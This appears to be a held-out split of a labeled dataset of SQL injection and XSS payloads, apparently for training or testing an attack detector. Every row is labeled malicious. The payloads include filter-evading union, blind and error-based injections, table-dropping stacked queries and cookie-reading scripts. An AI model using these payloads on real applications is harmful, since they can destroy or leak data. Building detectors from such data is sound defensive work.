text,label,attack_type,category,generator
"'%09aND+(select+count(*)+from%20products group+by%20concat((select	password from+orders%0alimit%201),floor(rand(0)*2)))-- 	",1,sqli,error,held_out
"""+UnION%09aLl%09sELECt/**_**/role,0x78,pwd%0aFrOm+staff+/*z*/",1,sqli,union,held_out
' ontoggle=(alert)(1) ',1,xss,attribute,held_out
"data:text/html,<audio onstart=alert(document.cookie)>",1,xss,dom,held_out
"<input
onstart=print()>",1,xss,reflected,held_out
"')/**_**/AND/*!*/updatexml(1,concat(0x7e,(select/**_**/balance/**/from%0aadmins%09limit%091)),1)%2d%2d ",1,sqli,error,held_out
<math	onerror=alert(document.cookie)><!--comment-->,1,xss,stored,held_out
"%27%09ANd/**_**/extractvalue(1,concat(0x7e,(select/**/role/**_**/from%20admins limit	1)))%2d%2d ",1,sqli,error,held_out
') OR+6=7+%2d%2d ,1,sqli,boolean_blind,held_out
'	Or	role=0x61646d696e#,1,sqli,hex_obf,held_out
<details onfocus=eval(atob('YWxlcnQoMSk='))><!--comment-->,1,xss,stored,held_out
"""/*!*/aNd+(select/**/count(*) from/**_**/tokens%20group%0aby concat((select%09pwd+from+products limit	1),floor(rand(0)*2)))-- -",1,sqli,error,held_out
"""><marquee onstart=print()>",1,xss,attribute,held_out
"')/**/oR+email=CHAR(117,110,105,111,110)-- 	",1,sqli,hex_obf,held_out
javascript:alert(document.cookie),1,xss,dom,held_out
<object	onpointerover=%28alert%29%281%29>,1,xss,reflected,held_out
#<svg onmouseover=eval(atob('YWxlcnQoMSk='))>,1,xss,dom,held_out
<math	onpointerover=window['ale'+'rt']`1`><!--stored-->,1,xss,stored,held_out
<svg/onbegin=alert(document.cookie)>,1,xss,reflected,held_out
';+DeLeTE/**/FrOm%09accounts%09-- ,1,sqli,stacked,held_out
<audio/ontoggle=(alert)(1)><!--stored-->,1,xss,stored,held_out
#<form onstart=window['ale'+'rt']`1`>,1,xss,dom,held_out
'/*!*/oR/**_**/5=8	-- 	,1,sqli,boolean_blind,held_out
"')/**_**/unioN aLL	SeleCT	token,balance/**_**/FrOM orders/*!*/-- 	",1,sqli,union,held_out
"""/**/or 0x61=0x61%0a-- 	",1,sqli,boolean_blind,held_out
"""+or%0atoken=0x73656c656374/*z*/",1,sqli,hex_obf,held_out
%27/*!*/anD	(SELECT+1 fROM/*!*/(SELECT(SLEEp(3)))x)-- ,1,sqli,time_blind,held_out
"""><input onpointerover=(alert)(1)>",1,xss,attribute,held_out
<details onmouseover=eval(atob('YWxlcnQoMSk='))>,1,xss,reflected,held_out
javascript:eval(atob('YWxlcnQoMSk=')),1,xss,dom,held_out
<iframe%09onpointerover=alert%28document.cookie%29>,1,xss,reflected,held_out
<input/onbegin=alert(document.cookie)><!--post-->,1,xss,stored,held_out
"""/**/OR/**/'a'LiKE'b'/**_**/%2d%2d ",1,sqli,boolean_blind,held_out
"""><body onanimationstart=alert(document.cookie)>",1,xss,attribute,held_out
"""/onbegin=eval(atob('YWxlcnQoMSk='))/x=""",1,xss,attribute,held_out
<marquee%20onpointerover=top['al'+'ert'](1)>,1,xss,reflected,held_out
"data:text/html,<input onpointerover=(alert)(1)>",1,xss,dom,held_out
<object/onerror=eval(atob('YWxlcnQoMSk='))><!--post-->,1,xss,stored,held_out
1/*!*/oR/*!*/balance=0x61646d696e-- 	,1,sqli,hex_obf,held_out
<form%09ontoggle=alert(1)>,1,xss,reflected,held_out
`/**_**/or%0a0x61=0x61	/*z*/,1,sqli,boolean_blind,held_out
<objectonload=window['ale'+'rt']`1`><!--comment-->,1,xss,stored,held_out
%27;/*!*/INseRt iNtO	tokens+vaLuES(1)/**_**/-- -,1,sqli,stacked,held_out
"data:text/html,<svg ontoggle=alert(document.cookie)>",1,xss,dom,held_out
"""/*!*/OR/**/1bETween+0%0aAnd%099/*!*/%2d%2d ",1,sqli,boolean_blind,held_out
"""	Or%09balance=0x726f6f74-- 	",1,sqli,hex_obf,held_out
#<iframe onbegin=eval(atob('YWxlcnQoMSk='))>,1,xss,dom,held_out
"%27%20anD%20updatexml(1,concat(0x7e,(select id%0afrom	sessions%09limit/**_**/1)),1)%2d%2d ",1,sqli,error,held_out
"""/*!*/OR/**_**/token=CHAR(114,111,111,116)-- ",1,sqli,hex_obf,held_out
`/**/Or/**/email=0x73656c656374-- ,1,sqli,hex_obf,held_out
"` anD (select count(*)+from/**_**/orders	group/**/by/**_**/concat((select/**/password/**/from%09admins+limit 1),floor(rand(0)*2)))-- -",1,sqli,error,held_out
<body/onpointerover=print()><!--stored-->,1,xss,stored,held_out
"""%09AND+extractvalue(1,concat(0x7e,(select%0apassword%20from/**_**/admins	limit/**_**/1)))%2d%2d ",1,sqli,error,held_out
"""><marquee onerror=alert(1)>",1,xss,attribute,held_out
%27/**/or+password=0x61646d696e-- ,1,sqli,hex_obf,held_out
"`%0aaND/**_**/updatexml(1,concat(0x7e,(select/**/role%20from+accounts/**/limit+1)),1)/*z*/",1,sqli,error,held_out
';/**/UpdATe%09members%20sEt%0atoken=1/*!*/-- -,1,sqli,stacked,held_out
""";%0aDelETE%20FRoM%20tokens/**/#",1,sqli,stacked,held_out
`; UpdaTe	products%20SEt%0apwd=1/**_**/#,1,sqli,stacked,held_out
<iframe onfocus=alert(document.cookie)>,1,xss,reflected,held_out
1 anD	(SELECT 1%20FrOm/**_**/(SELECT(sLEep(7)))x)-- -,1,sqli,time_blind,held_out
"%27/**_**/uNiON%09all%0aSelECT%09NULL,0x78,name,NULL/**/froM/**/products %2d%2d ",1,sqli,union,held_out
<iframe ontoggle=print()><!--stored-->,1,xss,stored,held_out
'%0aAND%0a(SELECT%201 frOm/**/(SELECT(SLeEp(6)))x)#,1,sqli,time_blind,held_out
<svg/ontoggle=alert(1)>,1,xss,reflected,held_out
"""	Or/**/0x61=0x61/*!*/%2d%2d ",1,sqli,boolean_blind,held_out
<video%20onpointerover=print()><!--post-->,1,xss,stored,held_out
`%0aOr ssn=0x73656c656374/*z*/,1,sqli,hex_obf,held_out
`/*!*/or	token=0x756e696f6e#,1,sqli,hex_obf,held_out
"%27	uNioN	all/**_**/SElEct/**_**/NULL,email,0x78%20fRoM/*!*/products+-- ",1,sqli,union,held_out
"data:text/html,<audio onmouseover=window['ale'+'rt']`1`>",1,xss,dom,held_out
"`	UNioN+ALl/**_**/selEcT/*!*/NULL,CHAR(120),CHAR(120),CHAR(120),pwd%20fROm/**/staff -- -",1,sqli,union,held_out
';	Insert%0aIntO%09admins/*!*/vALues(1)+%2d%2d ,1,sqli,stacked,held_out
1;	WAiTFoR DElay+'0:0:4'%20#,1,sqli,time_blind,held_out
"""	and	extractvalue(1,concat(0x7e,(select/**/email%09from%20users/**/limit+1)))-- ",1,sqli,error,held_out
'%0aoR%09password=0x73656c656374-- -,1,sqli,hex_obf,held_out
1;%20WaItfOr%09DELAY/*!*/'0:0:7'%20-- -,1,sqli,time_blind,held_out
1/**/oR/*!*/7betwEEn%200/**_**/aNd/**/9%20#,1,sqli,boolean_blind,held_out
<videoonstart=(alert)(1)>,1,xss,reflected,held_out
';/**/WaItfoR/**/DELAy/**_**/'0:0:3'%20-- 	,1,sqli,time_blind,held_out
"#<math onstart=alert(String.fromCharCode(88,83,83))>",1,xss,dom,held_out
<form%09onanimationstart=alert(document.cookie)><!--stored-->,1,xss,stored,held_out
<iframe%20onanimationstart=print()><!--comment-->,1,xss,stored,held_out
"""%0aOR/**/SlEeP(7)/**_**/-- 	",1,sqli,time_blind,held_out
';/*!*/iNsErt/**/intO%0aclients vALues(1)/*!*/-- 	,1,sqli,stacked,held_out
"""%20AND	(select	count(*)	from%09products	group/**_**/by%20concat((select/**/pwd from/**_**/orders%09limit%091),floor(rand(0)*2)))-- ",1,sqli,error,held_out
#<math onstart=eval(atob('YWxlcnQoMSk='))>,1,xss,dom,held_out
"' onload=alert(String.fromCharCode(88,83,83)) '",1,xss,attribute,held_out
%27/**_**/And+(SELECT+1/*!*/FrOM%09(SELECT(SLEep(3)))x)-- -,1,sqli,time_blind,held_out
'%0aOR/**/8=8	#,1,sqli,boolean_blind,held_out
""" ontoggle=(alert)(1) x=""",1,xss,attribute,held_out
';/*!*/WaiTfOR+DElaY+'0:0:9'	-- ,1,sqli,time_blind,held_out
'/**_**/OR/**_**/0x61=0x61%0a-- ,1,sqli,boolean_blind,held_out
1/**_**/OR+pwd=0x756e696f6e#,1,sqli,hex_obf,held_out
1+Or/*!*/0x61=0x61%09%2d%2d ,1,sqli,boolean_blind,held_out
"')+oR/**/ssn=CHAR(117,110,105,111,110)/*z*/",1,sqli,hex_obf,held_out
"data:text/html,<svg ontoggle=alert(1)>",1,xss,dom,held_out
<img	onerror=window['ale'+'rt']`1`><!--comment-->,1,xss,stored,held_out
"`%20AND/**_**/extractvalue(1,concat(0x7e,(select/**_**/balance	from+sessions%09limit	1)))-- ",1,sqli,error,held_out
"""><details onmouseover=alert(1)>",1,xss,attribute,held_out
<math	onstart=alert(document.cookie)><!--comment-->,1,xss,stored,held_out
<bodyonpointerover=alert(1)><!--post-->,1,xss,stored,held_out
<video%09onstart=window['ale'+'rt']`1`><!--post-->,1,xss,stored,held_out
"""%09unIoN/**_**/ALL%0aSELecT%0aNULL,CHAR(120)/**/FROm/**/members/**/-- ",1,sqli,union,held_out
"""%0aUnion/*!*/all%09SElECT id,name,id/*!*/from/**_**/staff %2d%2d ",1,sqli,union,held_out
""";%0aWaiTFOR/*!*/deLAy%20'0:0:6'%20-- -",1,sqli,time_blind,held_out
<input/onload=top['al'+'ert'](1)>,1,xss,reflected,held_out
<input/onfocus=print()>,1,xss,reflected,held_out
"data:text/html,<img onmouseover=alert(1)>",1,xss,dom,held_out
<iframe/onfocus=alert(document.cookie)><!--post-->,1,xss,stored,held_out
"""/**_**/or%20token=CHAR(115,101,108,101,99,116)-- -",1,sqli,hex_obf,held_out
<img	onpointerover=eval(atob('YWxlcnQoMSk='))>,1,xss,reflected,held_out
`%09or/**/9BETWEEn	0%09And/**_**/9 %2d%2d ,1,sqli,boolean_blind,held_out
"""%20oR%0a6beTween/**/0/*!*/And	9	/*z*/",1,sqli,boolean_blind,held_out
%27;/*!*/uPdAtE/**_**/members%09SeT%20password=1 %2d%2d ,1,sqli,stacked,held_out
"<video
onmouseover=top['al'+'ert'](1)><!--stored-->",1,xss,stored,held_out
<input onmouseover=window['ale'+'rt']`1`><!--stored-->,1,xss,stored,held_out
<imgonpointerover=alert(1)><!--comment-->,1,xss,stored,held_out
'+AnD%0a(SELECT+1%09FROM%20(SELECT(sleeP(7)))x)/*z*/,1,sqli,time_blind,held_out
"')/**/Or	token=CHAR(97,100,109,105,110)/*z*/",1,sqli,hex_obf,held_out
';%0aWAiTfOr+DeLay+'0:0:6'%20-- 	,1,sqli,time_blind,held_out
"""	onmouseover=alert(1)	x=""",1,xss,attribute,held_out
'/onmouseover=alert(1)/',1,xss,attribute,held_out
%27/**_**/OR%200x61=0x61%20-- -,1,sqli,boolean_blind,held_out
<video onerror=print()>,1,xss,reflected,held_out
<math/onfocus=top['al'+'ert'](1)><!--stored-->,1,xss,stored,held_out
"""/**/or+0x61=0x61/*!*/%2d%2d ",1,sqli,boolean_blind,held_out
<svg/onbegin=window['ale'+'rt']`1`>,1,xss,reflected,held_out
"1%0aAND (select	count(*)/**/from+accounts+group%20by/**/concat((select%09balance%20from%20staff limit/**/1),floor(rand(0)*2)))/*z*/",1,sqli,error,held_out
"%27%20ANd%09extractvalue(1,concat(0x7e,(select/**/token	from%09admins%0alimit/**/1)))-- ",1,sqli,error,held_out
"""/onpointerover=window['ale'+'rt']`1`/x=""",1,xss,attribute,held_out
');/**_**/UPdATe users%09sET%0apassword=1/**/-- ,1,sqli,stacked,held_out
"')/**/uniON%0aAll/**_**/seLecT%20CHAR(120),CHAR(120)%20frOm	members%0a-- -",1,sqli,union,held_out
<input/onload=(alert)(1)><!--stored-->,1,xss,stored,held_out
%27;	iNSeRT+iNTo/**_**/tokens/**/vaLuEs(1)/**/-- 	,1,sqli,stacked,held_out
"%27/*!*/unioN/*!*/alL	selECt%09NULL,0x78,CHAR(120),hash+FRoM%09accounts	-- -",1,sqli,union,held_out
<iframe%20onfocus=alert%28document.cookie%29>,1,xss,reflected,held_out
"%27%09uNIOn%20ALl+sEleCt+NULL,0x78,id,ssn,balance%20FROm products	#",1,sqli,union,held_out
`/**_**/Or/*!*/token=0x61646d696e%2d%2d ,1,sqli,hex_obf,held_out
%27	oR%0abalance=0x73656c656374-- ,1,sqli,hex_obf,held_out
'%0aoR%20SLeEp(3)+-- 	,1,sqli,time_blind,held_out
<svg/onanimationstart=eval(atob('YWxlcnQoMSk='))>,1,xss,reflected,held_out
#<body onload=(alert)(1)>,1,xss,dom,held_out
"""/*!*/oR	ssn=0x70617373776f7264-- 	",1,sqli,hex_obf,held_out
"`/**/UNiON+AlL	SEleCT	NULL,0x78,CHAR(120)+fROM clients #",1,sqli,union,held_out
#<input onpointerover=alert(1)>,1,xss,dom,held_out
"""><body onmouseover=alert(document.cookie)>",1,xss,attribute,held_out
#<form onerror=eval(atob('YWxlcnQoMSk='))>,1,xss,dom,held_out
<svg/onbegin=print()>,1,xss,reflected,held_out
1	Or/*!*/4=7 -- 	,1,sqli,boolean_blind,held_out
"'
onpointerover=print()
'",1,xss,attribute,held_out
1;+dROp/*!*/tabLe/*!*/sessions/*!*/#,1,sqli,stacked,held_out
""" UnIon%0aAll/**_**/SELECt%09NULL,CHAR(120)+FrOm	orders/**/%2d%2d ",1,sqli,union,held_out
';	uPdAtE%20sessions/*!*/Set/**/role=1%09%2d%2d ,1,sqli,stacked,held_out
<iframe%20onanimationstart=alert(1)><!--post-->,1,xss,stored,held_out
"#"";alert(String.fromCharCode(88,83,83));//",1,xss,dom,held_out
"""><img onmouseover=window['ale'+'rt']`1`>",1,xss,attribute,held_out
"1+UnioN/*!*/AlL/**/SElect+CHAR(120),NULL,NULL,CHAR(120),NULL+fROm%0aaccounts/**_**/%2d%2d ",1,sqli,union,held_out
"')+unioN%09aLl%0asELect/*!*/ssn,password,0x78%0aFrom%20clients/*!*//*z*/",1,sqli,union,held_out
%27/**/Or+email=0x726f6f74-- 	,1,sqli,hex_obf,held_out
""";+DElEtE FroM	members/**_**/%2d%2d ",1,sqli,stacked,held_out
"'%09uNIOn	aLl/*!*/SelEcT+ssn,NULL,CHAR(120)%20FRoM%0aproducts	-- -",1,sqli,union,held_out
1/**_**/Or+name=0x73656c656374-- -,1,sqli,hex_obf,held_out
<details%20onerror=(alert)(1)><!--comment-->,1,xss,stored,held_out
%27; waiTfor/*!*/dElAy%0a'0:0:3'%20-- ,1,sqli,time_blind,held_out
"""	aND+(SELECT/**/1+fRom	(SELECT(SLEep(4)))x)%2d%2d ",1,sqli,time_blind,held_out
"1 union/*!*/all%20SElECT%20password,CHAR(120),CHAR(120),CHAR(120)/**_**/fROM%20accounts/*!*//*z*/",1,sqli,union,held_out
"')	oR%0apwd=CHAR(97,100,109,105,110)-- -",1,sqli,hex_obf,held_out
<audio/onfocus=top['al'+'ert'](1)>,1,xss,reflected,held_out
#<marquee onbegin=window['ale'+'rt']`1`>,1,xss,dom,held_out
%27%0aOr SLeeP(6)	-- ,1,sqli,time_blind,held_out
"data:text/html,<input onerror=alert(document.cookie)>",1,xss,dom,held_out
')/*!*/or+token=0x726f6f74-- ,1,sqli,hex_obf,held_out
"1/**_**/aNd%09extractvalue(1,concat(0x7e,(select%20pwd	from/**_**/admins/**/limit%091)))-- 	",1,sqli,error,held_out
<audio%20onanimationstart=alert(document.cookie)><!--stored-->,1,xss,stored,held_out
1;%0adRop	TabLe	clients+#,1,sqli,stacked,held_out
"""%0aAND%20updatexml(1,concat(0x7e,(select/*!*/balance	from clients%20limit%201)),1)-- ",1,sqli,error,held_out
%27; Insert+into%0atokens/**/VAluEs(1)/**_**/-- ,1,sqli,stacked,held_out
#<details onbegin=(alert)(1)>,1,xss,dom,held_out
"""ontoggle=alert(document.cookie)x=""",1,xss,attribute,held_out
"<marquee
onmouseover=eval(atob('YWxlcnQoMSk='))><!--stored-->",1,xss,stored,held_out
`;+UpDATE/**/admins SeT	pwd=1/**/-- ,1,sqli,stacked,held_out
`/*!*/and%20(SELECT%201/*!*/froM%09(SELECT(SlEeP(7)))x)-- ,1,sqli,time_blind,held_out
"')%0aaND/**_**/(select%0acount(*)%20from+orders/**/group%20by+concat((select role/**_**/from	accounts limit/**_**/1),floor(rand(0)*2)))/*z*/",1,sqli,error,held_out
"1 UNion/**/all/*!*/SElECT/**_**/0x78,id,0x78,CHAR(120),role%09FrOM%0aproducts%09/*z*/",1,sqli,union,held_out
"""+OR/**_**/hash=0x756e696f6e-- -",1,sqli,hex_obf,held_out
1;/*!*/InSeRt	INtO+accounts+vALuES(1) -- 	,1,sqli,stacked,held_out
1;%09DELetE%20from%20sessions%0a%2d%2d ,1,sqli,stacked,held_out
')%0aor+7BeTween/**/0+aND 9+#,1,sqli,boolean_blind,held_out
<sCrIpT>window['ale'+'rt']`1`</sCrIpT>,1,xss,reflected,held_out
<img/onmouseover=eval(atob('YWxlcnQoMSk='))>,1,xss,reflected,held_out
');/**/DeLeTE/**_**/fRom%20sessions%20#,1,sqli,stacked,held_out
`%09oR/**/pwd=0x756e696f6e/*z*/,1,sqli,hex_obf,held_out
""" oR%0a0x61=0x61%09%2d%2d ",1,sqli,boolean_blind,held_out
"%27 aNd%0a(select%0acount(*)%20from/**_**/products+group%0aby	concat((select%0aname/**/from%0aaccounts%0alimit	1),floor(rand(0)*2)))/*z*/",1,sqli,error,held_out
"<iframe
onbegin=alert(document.cookie)><!--comment-->",1,xss,stored,held_out
1	oR/**/0x61=0x61/**_**//*z*/,1,sqli,boolean_blind,held_out
';%09deLETE+fRoM%20admins	-- 	,1,sqli,stacked,held_out
' onfocus=print() ',1,xss,attribute,held_out
"')%0aaNd	(select	count(*)	from%0atokens%09group by	concat((select email	from products+limit/*!*/1),floor(rand(0)*2)))-- -",1,sqli,error,held_out
<mathonanimationstart=(alert)(1)><!--comment-->,1,xss,stored,held_out
<imgonbegin=print()>,1,xss,reflected,held_out
<svgonpointerover=eval(atob('YWxlcnQoMSk='))><!--stored-->,1,xss,stored,held_out
"""	anD %2528SELECT%201/**/froM+(SELECT(sleEp(5)))x)-- ",1,sqli,time_blind,held_out
"')%0aUniON	all/*!*/sELECt%09CHAR(120),CHAR(120),0x78,balance,NULL+fRoM staff	-- -",1,sqli,union,held_out
"""%20or%0aname=CHAR(112,97,115,115,119,111,114,100)#",1,sqli,hex_obf,held_out
"""/**/UniON+AlL%0aSeLEct/*!*/0x78,NULL,0x78 FrOm/*!*/admins%09%2d%2d ",1,sqli,union,held_out
')%09Or	role=0x61646d696e-- 	,1,sqli,hex_obf,held_out
1;/**_**/uPdatE%09products sET	ssn=1	-- -,1,sqli,stacked,held_out
"1/**_**/aNd/**/updatexml(1,concat(0x7e,(select	ssn	from%20members%0alimit	1)),1)#",1,sqli,error,held_out
"<body%20ontoggle=alert(String.fromCharCode(88,83,83))><!--post-->",1,xss,stored,held_out
<math%09onbegin=alert(document.cookie)><!--post-->,1,xss,stored,held_out
%27	oR/**/0x61=0x61 #,1,sqli,boolean_blind,held_out
%27;%20waItfOr	DElAy%09'0:0:6'%09-- ,1,sqli,time_blind,held_out
"""
onload=alert(String.fromCharCode(88,83,83))
x=""",1,xss,attribute,held_out
'/**_**/And/**/(SELECT/*!*/1%0afRoM/*!*/(SELECT(SLeEp(7)))x)-- -,1,sqli,time_blind,held_out
%27;/**_**/delETe/*!*/frOM%20members/**_**//*z*/,1,sqli,stacked,held_out
"`%20UnION aLL	sELeCt/**_**/ssn,token,password+FroM accounts/**_**/-- ",1,sqli,union,held_out
"'ontoggle=alert(String.fromCharCode(88,83,83))'",1,xss,attribute,held_out
`/*!*/oR%20slEep(6)%0a%2d%2d ,1,sqli,time_blind,held_out
<audio onload=window['ale'+'rt']`1`><!--post-->,1,xss,stored,held_out
`/**_**/oR slEep(7)/**_**/%2d%2d ,1,sqli,time_blind,held_out
"'onstart=alert(String.fromCharCode(88,83,83))'",1,xss,attribute,held_out
<iframeonbegin=print()>,1,xss,reflected,held_out
'/**/or/**_**/SleeP(3)/**/-- -,1,sqli,time_blind,held_out
'+oR	SlEEP(8)%0a-- ,1,sqli,time_blind,held_out
%27/**/or/**/0x61=0x61/**_**/-- ,1,sqli,boolean_blind,held_out
'	ANd+(SELECT 1/*!*/FROm/**_**/(SELECT(SlEep(7)))x)%2d%2d ,1,sqli,time_blind,held_out
<object%20onload=eval(atob('YWxlcnQoMSk='))><!--comment-->,1,xss,stored,held_out
1	oR	balance=0x61646d696e/*z*/,1,sqli,hex_obf,held_out
"' onbegin=alert(String.fromCharCode(88,83,83)) '",1,xss,attribute,held_out
1;/*!*/uPDatE%0aadmins/*!*/SeT+balance=1+%2d%2d ,1,sqli,stacked,held_out
<body%09ontoggle=alert(1)><!--comment-->,1,xss,stored,held_out
"1/**_**/aND%20(select/**_**/count(*)/**_**/from%20products%20group/**_**/by/**_**/concat((select/*!*/role/*!*/from members/**/limit/**_**/1),floor(rand(0)*2)))#",1,sqli,error,held_out
"data:text/html,<object onbegin=window['ale'+'rt']`1`>",1,xss,dom,held_out
"')/**/or/**/balance=CHAR(114,111,111,116)-- -",1,sqli,hex_obf,held_out
<detailsonerror=top['al'+'ert'](1)><!--stored-->,1,xss,stored,held_out
#<object onpointerover=eval(atob('YWxlcnQoMSk='))>,1,xss,dom,held_out
#<body onanimationstart=top['al'+'ert'](1)>,1,xss,dom,held_out
<math%09ontoggle=top['al'+'ert'](1)><!--comment-->,1,xss,stored,held_out
""";%09WAITFOR%09dELAy/**/'0:0:4'	/*z*/",1,sqli,time_blind,held_out
"<svg/onbegin=alert(String.fromCharCode(88,83,83))>",1,xss,reflected,held_out
"#"";alert(1);//",1,xss,dom,held_out
`/**/or/*!*/'a'liKe'b'%0a-- 	,1,sqli,boolean_blind,held_out
"""%0auNION/**_**/ALL/**/SElEcT%200x78,NULL,NULL%0afROm/**_**/accounts+-- -",1,sqli,union,held_out
#<img onfocus=top['al'+'ert'](1)>,1,xss,dom,held_out
"<svg
onpointerover=print()><!--post-->",1,xss,stored,held_out
';%0adEletE	fROm/**_**/clients%20#,1,sqli,stacked,held_out
';%09WaItFor	dELaY%09'0:0:3'/**/%2d%2d ,1,sqli,time_blind,held_out
"'+UnIon/**/all/**_**/SEleCT%09CHAR(120),NULL,CHAR(120),CHAR(120),0x78 fRoM/**_**/users/*!*//*z*/",1,sqli,union,held_out
#<details onstart=(alert)(1)>,1,xss,dom,held_out
"""+or sLeEP(3)/**_**/#",1,sqli,time_blind,held_out
%27;%0awaITfOR/**/DelAY%09'0:0:3'/**/#,1,sqli,time_blind,held_out
`;+DELete/**_**/froM/**_**/members%0a-- 	,1,sqli,stacked,held_out
<audio	ontoggle=alert(1)>,1,xss,reflected,held_out
<audio	onload=eval(atob('YWxlcnQoMSk='))>,1,xss,reflected,held_out
<img%20onanimationstart=(alert)(1)><!--stored-->,1,xss,stored,held_out
"#"";print();//",1,xss,dom,held_out
"'/**_**/AND%20updatexml(1,concat(0x7e,(select/*!*/pwd/**/from%20products%0alimit 1)),1)#",1,sqli,error,held_out
